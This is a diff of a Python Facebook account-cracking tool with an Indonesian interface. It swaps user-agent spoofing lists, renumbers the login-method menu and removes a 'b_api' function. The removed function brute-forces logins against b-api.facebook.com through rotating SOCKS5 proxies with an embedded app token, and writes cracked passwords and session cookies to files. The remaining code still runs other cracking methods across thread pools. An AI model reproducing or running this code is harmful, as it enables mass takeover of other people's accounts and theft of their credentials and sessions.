@@ -144,30 +144,16 @@ try:
 except :
 	ugent = "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"
 	
-
-for t in range(1000):
-    rc = random.choice
-    rr = random.randint
-    andro = f"{rr(4,13)}"
-    samsung = rc([
-        'SAMSUNG SM-G532G Build/MMB29T', 'SAMSUNG SM-G532M', 'SAMSUNG SM-G532M',
-        'SAMSUNG SM-G975F', 'SAMSUNG SM-A515F', 'SAMSUNG SM-A715F', 'SAMSUNG SM-G532G',
-        'SAMSUNG SM-J200G Build/LMY47X', 'SAMSUNG SM-G610M', 'SM-G532G Build/MMB29T',
-        'SAMSUNG SM-G610F', 'SAMSUNG SM-G610F', 'SAMSUNG SM-G570M', 'SAMSUNG SM-G532MT',
-        'SAMSUNG SM-A205G', 'SAMSUNG SM-J700M', 'SAMSUNG SM-N950F', 'SAMSUNG SM-G935F',
-        'SAMSUNG SM-A217F', 'SAMSUNG SM-G965F', 'SAMSUNG SM-A105M', 'SAMSUNG SM-J500M',
-        'SAMSUNG SM-G950F', 'SAMSUNG SM-A505F', 'SAMSUNG SM-G532M Build/MMB29T',
-        'SAMSUNG SM-N975F', 'SAMSUNG SM-J701M', 'SAMSUNG SM-J710MN', 'SAMSUNG SM-N960F',
-        'SAMSUNG SM-A505F', 'SAMSUNG SM-G532F', 'SAMSUNG SM-A515F', 'SAMSUNG SM-A107M'
-    ])
-    fanky = f"Dalvik/2.1.0 (Linux; U; Android {rr(1, 14)}; {samsung}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{rr(10, 14)}.{rr(1, 10)} Chrome/{rr(30, 270)}.0.{rr(15, 7000)}.{rr(20, 275)} Mobile Safari/537.36"
-    d = f"Dalvik/2.1.0 (Linux; U; Android {andro}; V2043_21 Build/RP1A.200720.012) [FBAN/MessengerLite;FBAV/{rr(100,467)}.0.0.5.119;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{rr(100000000,9000000000)};FBCR/Warid;FBMF/vivo;FBBD/vivo;FBDV/V2043_21;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density=2.25,height=,width=}};]"
-    a = f"Dalvik/2.1.0 (Linux; U; Android {andro}; moto g52 Build/S1SRS32.38-132-8) [FBAN/MessengerLite;FBAV/{rr(100,467)}.0.0.7.131;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/543901789;FBCR/;FBMF/motorola;FBBD/motorola;FBDV/moto g52;FBSV/{andro};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{{density=2.25,height=1024,width=2048}};]"
-    n = f"Dalvik/2.1.0 (Linux; U; Android {andro}; SM-J330FN Build/PPR1.180610.011) [FBAN/MessengerLite;FBAV/{rr(100,467)}.0.0.3.109;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/{rr(100000000,9000000000)};FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBDV/SM-J330FN;FBSV/{andro};FBCA/armeabi-v7a:armeabi;FBDM/{{density=2.25,height=,width=}};]"
-    siska = f"Dalvik/2.1.0 (Linux; U; Android {andro}; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/{rr(100,467)}.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/{rr(100000000,9000000000)};FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/{andro};FBCA/armeabi-v7a:armeabi;FBDM/{{density=3.0,width=1080,height=1920}};]"
-    ua = random.choice([fanky])
-    ugen.append(ua)
-
+uren = [
+    'Mozilla/5.0 (Linux; Android 9; Samsung Galaxy S10 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.121 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/300.0.0.46.124;]',
+    'Mozilla/5.0 (Linux; Android 8.1.0; Huawei P20 Pro Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/312.0.0.45.129;]',
+    'Mozilla/5.0 (Linux; Android 10; OnePlus 7T Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36[FBAN/EMA;FBLC/es_ES;FBAV/320.0.0.39.118;]',
+    'Mozilla/5.0 (Linux; Android 11; Google Pixel 4 XL Build/RP1A.201005.004; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36[FBAN/EMA;FBLC/de_DE;FBAV/325.0.0.40.119;]',
+    'Mozilla/5.0 (Linux; Android 9; Oppo Reno3 Build/PKQ1.190408.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.111 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_PT;FBAV/330.0.0.45.120;]',
+    'Mozilla/5.0 (Linux; Android 10; Xiaomi Redmi Note 8 Build/QKQ1.190828.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36[FBAN/EMA;FBLC/en_IN;FBAV/340.0.0.50.123;]',
+    'Mozilla/5.0 (Linux; Android 12; Samsung Galaxy Note 20 Build/SP1A.210812.015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.212 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/350.0.0.40.125;]'
+]
+ugen = rc(uren)
 for t in range(10000):
 	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
 	udin=random.choice(['R111-','R108-','R110-','R109-'])
@@ -1311,20 +1297,18 @@ def setting():
 
 
     # Input untuk metode login
-    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]B-API [bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]MTOUCH [bold white] [/]\n{P2}[{color_text}04{P2}] Login Site [bold green]Touch[bold white] [/]\n{P2}[{color_text}05{P2}] Login Site [bold green]IP [bold white][[bold green]Recommended[bold white]][bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
+    Console().print(Panel(f"{P2}[{color_text}01{P2}] Login Site [bold green]graph[bold white] [/]\n{P2}[{color_text}02{P2}] Login Site [bold green]MTOUCH [bold white] [/]\n{P2}[{color_text}03{P2}] Login Site [bold green]Touch[bold white] [/]\n{P2}[{color_text}04{P2}] Login Site [bold green]IP [bold white][[bold green]Recommended[bold white]][bold white] [/]",width=60,style=f"{color_panel}",title="[bold green] Method"))
     fankylog = console.input(f" {H2}• {P2}Masukan : ").strip()
     if fankylog in ["1", "01"]:
         method.append("fankygraph")
     elif fankylog in ["2", "02"]:
-        method.append("fankymfb")
-    elif fankylog in ["3", "03"]:
         method.append("fankygraphv2")
-    elif fankylog in ["4", "04"]:
+    elif fankylog in ["3", "03"]:
         method.append("fankywww")
-    elif fankylog in ["5", "05"]:
+    elif fankylog in ["4", "04"]:
         method.append("fankybapi")
     else:
-        method.append("fankymfb")  # Default metode
+        method.append("fankybapi")  # Default metode
     # Pengaturan User-Agent
     Console().print(Panel(
         f"[bold white]Apakah Anda Ingin Menggunakan UA Manual? Y/T",
@@ -1458,12 +1442,10 @@ def metslow():
                     pool.submit(fankywww,idf,pwv)
                 elif "fankygraphv2" in method:
                     pool.submit(fankytouch,idf,pwv)
-                elif "fankymfb" in method:
-                    pool.submit(b_api,idf,pwv)
                 elif "fankybapi" in method:
                     pool.submit(fanky_b_api,idf,pwv)
                 else:
-                    pool.submit(fankymobile,idf,pwv)
+                    pool.submit(fanky_b_api,idf,pwv)
                                     
                 	
                 	
@@ -1531,12 +1513,10 @@ def metcepat():
                     pool.submit(fankywww,idf,pwv)
                 elif "fankygraphv2" in method:
                     pool.submit(fankytouch,idf,pwv)
-                elif "fankymfb" in method:
-                    pool.submit(b_api,idf,pwv)
                 elif "fankybapi" in method:
                     pool.submit(fanky_b_api,idf,pwv)
                 else:
-                    pool.submit(fankymobile,idf,pwv)
+                    pool.submit(fanky_b_api,idf,pwv)
     print("")
     Console().print(
         Panel(
@@ -1551,62 +1531,6 @@ def metcepat():
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
     print("")
 
-
-#-------------------[ CRACK-MAIN ]------------#
-def b_api(idf, pwv):
-    global loop, ok, cp
-    bo = random.choice([m, k, h, b, u, x])
-    rr = random.randint
-    rc = random.choice
-    ses = requests.Session()
-    prog.update(des, description=f" {K2}•{H2} FANKY B-API {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
-    prog.advance(des)
-    #ua = f"Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36"
-    ua = random.choice(ugen)
-    for pw in pwv:
-        try:
-            if 'ya' in ualuh: 
-                ua = ualu[0]
-            nip = random.choice(prox)
-            proxs = {'http': 'socks5://' + nip}
-            params = ({ "access_token": "237759909591655|25257C0f140aabedfb65ac27a739ed1a2263b1", "sdk_version": random.randint(1, 26), "email": idf, "locale": "en_US", "password": pw, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6" })
-            headers = ({ "Host": "b-api.facebook.com", "x-fb-sim-hni": str(random.randint(100000, 300000)), "x-fb-net-hni": str(random.randint(100000, 300000)), "x-fb-connection-quality": "EXCELLENT", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-device-group": f"{str(random.randint(1000, 4000))}", "x-fb-friendly-name": "RelayFBNetwork_GemstoneProfilePreloadableNonSelfViewQuery", "x-fb-request-analytics-tags": "unknown", "accept-encoding": "gzip, deflate", "x-fb-http-engine": "Liger", "connection": "close" })
-            post = ses.post(f"https://b-api.facebook.com/method/auth.login/", params=params, headers=headers, allow_redirects=False,proxies=proxs)
-
-            if "User must verify their account" in post.text:
-                cp += 1
-                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
-                prints(tree)
-                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
-                break
-
-            elif "session_key" in post.text and "EAA" in post.text:
-                ok += 1
-                kuki = ";".join(i["name"] + "=" + i["value"] for i in post.json()["session_cookies"]);user = re.findall("c_user=(.*?)", kuki)[0]
-                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
-                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
-                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
-                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
-                prints(tree)
-                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
-                break
-
-            elif "Calls to this api have exceeded the rate limit. (613)" in post.text:
-                prog.update(des, description=f" {K2}•{K2} SPAM {H2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]", end="")
-                prog.advance(des)
-                time.sleep(10)
-
-            else:
-                continue
-
-        except requests.exceptions.ConnectionError:
-            time.sleep(31)
-
-    loop += 1
 	
 #-------------------[ CRACK-MAIN ]------------#
 def fankygraphv1(idf, pwv, url):
